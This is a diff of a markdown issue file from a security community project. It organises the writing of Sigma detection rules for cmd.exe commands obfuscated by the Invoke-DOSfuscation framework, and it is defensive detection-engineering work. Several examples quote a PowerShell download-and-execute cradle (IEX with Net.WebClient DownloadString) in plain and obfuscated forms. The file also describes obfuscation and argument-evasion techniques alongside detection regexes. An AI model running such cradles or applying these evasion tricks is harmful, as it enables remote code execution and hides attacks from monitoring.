@@ -1,4 +1,5 @@
-# Issue Contents
+# Contents
+
 * [Summary](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#summary)
 * [Problem](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#problem)
 * [Solution](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#solution)
@@ -22,14 +23,19 @@
 
 ## Problem
 
-The majority (>50%) of Sigma rules are based on command-line events (WEL Security Event ID 4688 and Sysmon Event ID 1), but the presence of Sigma rules for cmd.exe command Obfuscation Indicators detection is quite limited.
+Sigma rules heavily relies on process execution (with command-line) events (Windows Event Log Security Event ID 4688 and Sysmon Event ID 1). At the same time, the presence of Sigma rules for cmd.exe command Obfuscation Indicators detection is quite limited.  
 
-There is only one Sigma rule that is focusing on cmd.exe commandline obfuscation detection — [rules/windows/process_creation/win_susp_cli_escape.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_cli_escape.yml). The most of the methods, supported by [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) are not covered at all.
+There is only one Sigma rule that is focusing on cmd.exe commandline obfuscation detection — [rules/windows/process_creation/win_susp_cli_escape.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_cli_escape.yml). 
+
+The most of the obfuscation methods, provided by [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) framework are not covered at all.
 
 ## Solution
 
-We developed a table with [Tasks](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#how-to-work-with-tasks) for detecting CMD commands obfuscated by the [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) framework, you can pick up some of the Tasks in that table and develop Sigma rules for them.<br>
+We developed a table with [tasks](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#how-to-work-with-tasks) for detecting CMD commands obfuscated by specific methods that the [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) framework provides. 
+You can pick up some of the tasks listed in the table and develop Sigma rules for them.  
+
 You will need to use [regular expression value modifier](https://github.com/Neo23x0/sigma/wiki/Specification#types), provided by Sigma converter (sigmac). Here is an example of [Sigma rule](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_invoke_obfuscation_obfuscated_iex_commandline.yml) developed by Daniel Bohannon ([@danielhbohannon](https://twitter.com/danielhbohannon)) that utilizes a regular expression value modifier (`|re`):
+
 ```YAML
 title: Invoke-Obfuscation Obfuscated IEX Invocation
 id: 4bf943c6-5146-4273-98dd-e958fd1e3abf
@@ -61,61 +67,85 @@ level: high
 ## The Approach
 
 The framework provides 3 main obfuscation options:
+
 * [BINARY](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#binary-environment-variable-substrings-and-for-loop) - Obfuscated binary syntax for cmd.exe & powershell.exe
 * [ENCODING](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#encoding) - Environment variable encoding
 * [PAYLOAD](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#payload) - Obfuscated payload via DOSfuscation
 
+Let's go through them one by one.
+
 ### BINARY
+
 #### Environment Variable Substrings
-One way to obfuscate the string PowerShell in this example command:
+
+Here is a PowerShell command, that we will use as as example:
+
 ```CMD
 cmd.exe /c “powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
-is to substitute individual characters with substrings of existing environment variable values. For example, executing the internal command ```set``` displays all environment variable name and value pairs.<br>
-![binex 1](https://i.ibb.co/0yWVwQz/image.png)<br>
-The ```ALLUSERSPROFILE``` environment variable contains the character ```r``` at the 4th and 7th indexes. These single characters can be retrieved using cmd.exe’s native substring functionality: ```%ALLUSERSPROFILE:~4,1%``` or ```%ALLUSERSPROFILE:~7,1%```.<br>
-![binex 2](https://i.ibb.co/crTRJ94/image.png)<br>
-Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFILE:~4,1%Shell```. Adding this obfuscation back into the sample malicious command results in:
+
+One of the ways to obfuscate it, is to substitute individual characters with substrings of existing environment variable values. 
+For example, executing the internal command ```set``` displays all environment variable name and value pairs.  
+
+![binex 1](https://i.ibb.co/0yWVwQz/image.png)   
+
+The `ALLUSERSPROFILE` environment variable contains the character `r` at the 4th and 7th indexes. 
+These single characters can be retrieved using `cmd.exe`’s native substring functionality: `%ALLUSERSPROFILE:~4,1%` or `%ALLUSERSPROFILE:~7,1%`.  
+
+![binex 2](https://i.ibb.co/crTRJ94/image.png)  
+
+Substituting the character `r` in PowerShell produces: `Powe%ALLUSERSPROFILE:~4,1%Shell`.  
+Adding this obfuscation back into the malicious command sample results with:
+
 ```CMD
 cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
-![binex 3](https://i.ibb.co/HK50bQW/image.png)<br>
 
-However, we will detect the command line arguments when the process executes because existing environment variables resolve to their underlying value when executed by cmd.exe, even when substring syntax is used. <br>
-So this subtype of binary obfuscation is considered out of scope for this Issue.
+![binex 3](https://i.ibb.co/HK50bQW/image.png)  
+
+However, we will detect the command line arguments when the process executes because existing environment variables resolve to their underlying value when executed by `cmd.exe`, even when substring syntax is used.  
+So this subtype of binary obfuscation is considered out of scope for this issue.  
 
 #### For Loop
-It is possible to construct a binary name like ```cmd``` or ```PowerShell``` in memory that does not resolve on cmd.exe’scommand line upon execution, evading both static and dynamic detections focusing on the presence of these values. But in the last child Process Creation WEL Security Event ID 4688 existing environment variables resolve to their underlying value. E.g. if we'll use this example command:
+
+It is possible to construct a binary name like `cmd` or `PowerShell` in memory that does not resolve on `cmd.exe`’scommand line upon execution, evading both static and dynamic detections focusing on the presence of these values. But in the last child Process Creation Windows Event Llog Security Event ID 4688 existing environment variables resolve to their underlying value. E.g. if we'll use this example command:
+
 ```CMD
 cmd /c "FOR /F "delims=6M. tokens=2" %Z IN ('ftype^|findstr lMo')DO %Z IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')"
 ```
-we'll see the following parent-child process creation chain in WEL:
+
+we'll see the following parent-child process creation chain in the Windows Event Log:
+
 ```XML
  <Data Name="NewProcessId">0x990</Data> 
  <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data> 
  <Data Name="CommandLine">cmd /c "FOR /F "delims=6M. tokens=2" %Z IN ('ftype^|findstr lMo')DO %Z IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')"</Data> 
->
+
  <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
  <Data Name="ProcessId">0x990</Data> 
  <Data Name="CommandLine">C:\Windows\system32\cmd.exe /c ftype|findstr lMo</Data> 
->
+
  <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
  <Data Name="ProcessId">0x990</Data> 
  <Data Name="CommandLine">PowerShell IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')</Data> 
 ```
-So this subtype of binary obfuscation is considered out of scope for this Issue.
 
-Therefore all binary obfuscation is considered out of scope for this Issue.
+So this subtype of binary obfuscation is considered out of scope for this issue.
+
+Therefore all binary obfuscation is considered out of scope for this issue.
 
 ### ENCODING
+
 Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. These payload encoding techniques only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files, so they are considered out of scope for this Issue.
 
 ### PAYLOAD
-As Daniel Bohannon ([@danielhbohannon](https://twitter.com/danielhbohannon)) himself pointed out, there are numerous building blocks that must be combined to perform the advanced payload encoding techniques. Searching for these building blocks in process arguments, common persistence locations and in file repositories is a good first step in reducing the data set when building robust detections for DOSfuscation in general. We're going to use Sigma so we'll be looking for those building blocks in command-line events (WEL Security Event ID 4688 and Sysmon Event ID 1).
 
-Some basic building block concepts for each of the advanced encoding techniques are outlined below, ```netstat -ano``` is used as an example command:
+As Daniel Bohannon ([@danielhbohannon](https://twitter.com/danielhbohannon)) pointed out, there are numerous building blocks that must be combined to perform the advanced payload encoding techniques. Searching for these building blocks in process arguments, common persistence locations and in file repositories is a good first step in reducing the data set when building robust detections for DOSfuscation in general. We're going to use Sigma so we'll be looking for those building blocks in command-line events (WEL Security Event ID 4688 and Sysmon Event ID 1).
+
+Some basic building block concepts for each of the advanced encoding techniques are outlined below, `netstat -ano` is used as an example command:
+
 * Concatenation
-   * Numerous ```set``` commands + logical operators ```&``` or ```&&``` + ```call``` command 
+   * Numerous `set` commands + logical operators `&` or `&&` + `call` command 
    ```cmd
    cmd /c “set com3= /ano&&set com2=stat&&set com1=net&& call set final=%com1%%com2%%com3%&&call%final%”
    ```
@@ -125,34 +155,37 @@ Some basic building block concepts for each of the advanced encoding techniques 
    ```
    
 * FORcoding
-   * ```set``` command + for loop syntax + variable substring syntax like  ```!var:~%A,1!``` + ```if``` statement + ```callcommand``` + variable substring syntax like ```%var:~7%```, ```%var:~-12%``` or ```!var:~%A,1!```
+   * `set` command + for loop syntax + variable substring syntax like  `!var:~%A,1!` + `if` statement + `callcommand` + variable substring syntax like `%var:~7%`, `%var:~-12%` or `!var:~%A,1!`
    ``` cmd
    cmd /V:ON /C “set unique=nets/ao&&FOR %AIN (0 1 2 3 2 6 2 4 5 6 0 7 1337) DO set final=!final!!unique:~%A,1!&&IF %A==1337 CALL %final:~-12%”
    ```
    
 * Reversal
-   * Similar to #2 (FORcoding) but can include the for loop’s ```/L``` argument + start/increment/end integers
+   * Similar to #2 (FORcoding) but can include the for loop’s `/L` argument + start/increment/end integers
    ```cmd
    cmd /V:ON /C “set reverse=ona/ tatsten&& FOR /L %AIN (11 -1 0) DO set final=!final!!reverse:~%A,1!&&IF %A==0 CALL %final:~-12%”
    ```
    
 * FINcoding
-   * Numerous ```set``` commands + multiple string substitutions like ```%var:Z=t%``` or ```!var:e=7!``` or string removals like ```%var:@=%```
+   * Numerous `set` commands + multiple string substitutions like `%var:Z=t%` or `!var:e=7!` or string removals like `%var:@=%`
    ```cmd
    cmd /V:ON /C “set command=neZsZ7Z /7no&&  set sub2=!command:7=a!&&set sub1=!sub2:Z=t!&&CALL %sub1%”
    ```
-The above building block suggestions are extremely basic and should merely serve as a starting point for detection development. However, this should begin reducing the amount of data returned from initial searches. In the case of small environments there may not be much noise at all to filter out. However, in other environments there might be one of many enterprise applications that legitimately uses for loops, variable substrings and concatenated strings on the command line in high quantities. In these environments multiple iterations and layers of detection tuning may be required.
 
-Another example is CMD argument obfuscation. An obvious first choice would be anchoring these detections on process executions with arguments containing ```/C```, but there are numerous pitfalls to consider if using this approach:
-* Whitespace is not required before or after the ```/C``` argument: ```cmd/Ccalc```
-* Caret characters can break up the argument: ```cmd^/^C^calc```
-* Even if detection authors account for whitespace and caret obfuscation characters applied to the ```/C``` argument, cmd.exe’s help menu states that “for compatibility reasons...```/R``` is the same as ```/C```.” So ```cmd/Ccalc``` is the same as ```cmd/Rcalc```.<br>
+The examples listed above are extremely basic and should be used only as a starting point for detection development. However, this should begin reducing the amount of data returned from initial searches. In the case of small environments there may not be much noise at all to filter out. However, in other environments there might be one of many enterprise applications that legitimately uses FOR loops, variable substrings and concatenated strings on the command line in high quantities. In these environments multiple iterations and layers of detection tuning may be required.
 
-Another anchor character term in many of the payload encoding techniques is the ```/V:ON``` argument for enabling delayed environment variable expansion. However, it too is subject to several pitfalls:
-* Whitespace is not required before or after the ```/V:ON``` argument: ```cmd/V:ON/Ccalc```
-* Caret characters can break up the argument: ```cmd^/^V^:^O^N^/Ccalc```   
-* ```/V:ON``` can also be written as ```/V:O```, ```/V:```, ```/V```, and (barring some minor syntax exceptions and the ```/V:OFF``` argument) any combination of characters after ```/V``` including ```/VeryObfuscated```, ```/VivaLaVida```, ```/V_--_==```, etc.
-* It is also worth noting that in the context of cmd.exe’s arguments, ```\C``` means nothing if appearing before ```/C```. An example intended to throw off visual inspection of command line arguments would be ```cmd.exe \C echo %PATH%``` <100’s of whitespace characters> ```/C netstat /ano``` where everything before ```/C``` is ignored.
+Another example is CMD argument obfuscation. An obvious first choice would be anchoring these detections on process executions with arguments containing `/C`, but there are numerous pitfalls to consider if using this approach:
+
+* Whitespace is not required before or after the `/C` argument: `cmd/Ccalc`
+* Caret characters can break up the argument: `cmd^/^C^calc`
+* Even if detection authors account for whitespace and caret obfuscation characters applied to the `/C` argument, `cmd.exe`’s help menu states that “for compatibility reasons...`/R` is the same as `/C`.” So `cmd/Ccalc` is the same as `cmd/Rcalc`.  
+
+Another anchor character term in many of the payload encoding techniques is the `/V:ON` argument for enabling delayed environment variable expansion. However, it is also a has a several pitfalls:
+
+* Whitespace is not required before or after the `/V:ON` argument: `cmd/V:ON/Ccalc`
+* Caret characters can break up the argument: `cmd^/^V^:^O^N^/Ccalc`   
+* `/V:ON` can also be written as `/V:O`, `/V:`, `/V`, and (barring some minor syntax exceptions and the `/V:OFF` argument) any combination of characters after `/V` including `/VeryObfuscated`, `/VivaLaVida`, `/V_--_==`, etc.
+* It is also worth noting that in the context of `cmd.exe`’s arguments, `\C` means nothing if appearing before `/C`. An example intended to throw off visual inspection of command line arguments would be `cmd.exe \C echo %PATH%` <100’s of whitespace characters> `/C netstat /ano` where everything before `/C` is ignored by the interpreter.
 
 Considering all this we developed a table with pre-generated CMD commands, obfuscated by the [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) framework, to achieve our main goal to detect the obfuscation method looking for similar patterns in all of it obfuscation examples.
 
@@ -161,15 +194,18 @@ Considering all this we developed a table with pre-generated CMD commands, obfus
 We consider that we're able to apply all regexes as not case sensitive or that all events are lowercased in a log pipeline before indexing in SIEM/LM system.
 
 ### Framework coverage
+
 For fuzzing and deep exploration of the numerous tuning options for each obfuscation category, it is recommended that the individual functions be used directly outside of the Invoke-DOSfuscation function wrapper.
 
 ## Framework's Test Harness Module
-The author of the framework Daniel Bohannon ([@danielhbohannon](https://twitter.com/danielhbohannon)) provided a separate [Test Harness Module](https://github.com/danielbohannon/Invoke-DOSfuscation/blob/master/Invoke-DOSfuscationTestHarness.psm1). All functions in this module are solely for the test harness functionality for Invoke-DOSfuscation and do not provide any additional obfuscation functionality. This test harness is meant to enable defenders to easily define and test regex-based detection ideas for command line values of obfuscated commands produced by Invoke-DOSfuscation. In addition, this harness returns PSCustomObjects containing all user-defined detection information to help identify payloads that are undetected or only have 1-2 detection matches.
+
+The author of the framework developed the [Test Harness Module](https://github.com/danielbohannon/Invoke-DOSfuscation/blob/master/Invoke-DOSfuscationTestHarness.psm1). All functions in this module are dedicated to the test harness functionality for Invoke-DOSfuscation and do not provide any additional obfuscation functionality. This test harness is meant to enable defenders to easily define and test regex-based detection ideas for detection of obfuscated commands produced by Invoke-DOSfuscation. In addition, the harness module returns PSCustomObjects containing all user-defined detection information to help identify obfuscated payloads that were undetected or only had 1-2 detection matches.
 
 ## How To Use Test Harness Module
-1. Install [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation#installation).
-2. Open the ```Invoke-DOSfuscationTestHarness.psm1``` in a text editor of your choice.<br>
-2.1. Find [this code block](https://github.com/danielbohannon/Invoke-DOSfuscation/blob/master/Invoke-DOSfuscationTestHarness.psm1#L293-L296) with the ```$regexDetectionTerms``` array. Daniel Bohannon ([@danielhbohannon](https://twitter.com/danielhbohannon)) already included a couple of sample detection rules in the ```$regexDetectionTerms``` array:
+
+1. Install [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation#installation).  
+2. Open the `Invoke-DOSfuscationTestHarness.psm1` in a text editor of your choice.  
+2.1. Find [this code block](https://github.com/danielbohannon/Invoke-DOSfuscation/blob/master/Invoke-DOSfuscationTestHarness.psm1#L293-L296) with the `$regexDetectionTerms` array. The author already included a couple of sample detection rules in the `$regexDetectionTerms` array:
 ```
 Name = 'UnobfuscatedForLoop'  ; Expression = 'FOR\s+\/[A-Z]\s+\%[A-Z]\s+IN.*DO\s'
 Name = 'MultipleVarSubstring' ; Expression = '\%.{0,25}:~.{0,25}\%.*\%.{0,25}:~.{0,25}\%'
@@ -178,7 +214,7 @@ Name = 'MultipleVarSubstring' ; Expression = '\%.{0,25}:~.{0,25}\%.*\%.{0,25}:~.
 ```powershell
 Import-Module .\Invoke-DOSfuscation.psd1
 ```
-4. Check what we can detect with regexes already included in the ```$regexDetectionTerms``` array by Daniel Bohannon ([@danielhbohannon](https://twitter.com/danielhbohannon)) by running the following command:
+4. Check what we can detect with regexes, provided by the author of the project, execuitng the following command:
 ```powershell
 Invoke-DosTestHarness
 ```
@@ -186,15 +222,16 @@ this command generates (with default argument settings) over 1000 randomly-obfus
 ```powershell
 Get-DosDetectionMatch
 ```
-this function checks an input command (string) against all regex detection values input into the ```$regexDetectionTerms``` array in the function. This is automatically called by ```Invoke-DosTestHarness``` but can be called in a stand-alone fashion as well.
+this function checks an input command (obfuscated string) against all detection regex values stored in the `$regexDetectionTerms` array. This is automatically called by `Invoke-DosTestHarness` but can be called in a stand-alone fashion as well.
 
- 5. You will see the results at the end in a table like this:
-![example2](https://i.ibb.co/wpKC7w0/image.png)</br>
+5. You will see the results at the end in a table like this one:
+![example2](https://i.ibb.co/wpKC7w0/image.png)  
 also two files will be generated in the framework's folder (framework automatically detects the correct path):
 * ```FAILED_COMMANDS.txt``` - contains failed commands;
 * ```UNDETECTED_COMMANDS.txt``` - contains undetected commands.
 
 ## How To Work with Tasks
+
 1. These are the Tasks for this Issue:
 <table style="word-break: keep-all;">
  <tr>
@@ -236,7 +273,7 @@ Invoke-DosTestHarness -Functions @('Out-DosConcatenatedCommand')
 ```
 check the ```UNDETECTED_COMMANDS.txt```.</br>
 
- 4. Develop your regexes and add them in the ```$regexDetectionTerms``` array in [this code block](https://github.com/danielbohannon/Invoke-DOSfuscation/blob/master/Invoke-DOSfuscationTestHarness.psm1#L293-L296) like that:
+4. Develop your regexes and add them in the ```$regexDetectionTerms``` array in [this code block](https://github.com/danielbohannon/Invoke-DOSfuscation/blob/master/Invoke-DOSfuscationTestHarness.psm1#L293-L296) like that:
 ![example1](https://i.ibb.co/Px4DqKk/image.png)
 
 5. Reimport the Module:
@@ -246,4 +283,4 @@ Import-Module .\Invoke-DOSfuscation.psd1 -Force
 rerun the ```Invoke-DosTestHarness```, check the ```UNDETECTED_COMMANDS.txt``` again and repeat the whole process until all of the obfuscation function's examples are covered and there is no more ```UNDETECTED_COMMANDS.txt```, like this for example:
 ![Example3](https://i.ibb.co/TYLp33v/image.png)
 
- 6. Comment on the Issue with a specific Task you've solved and include your regexes. After we all assure that the suggested solution is correct, create a Sigma rule and a pull request to the OSCD's Branch of the [Sigma Repository](https://github.com/Neo23x0/sigma/).
+6. Comment on the Issue with a specific Task you've solved and include your regexes. After we all assure that the suggested solution is correct, create a Sigma rule and a pull request to the OSCD's Branch of the [Sigma Repository](https://github.com/Neo23x0/sigma/).
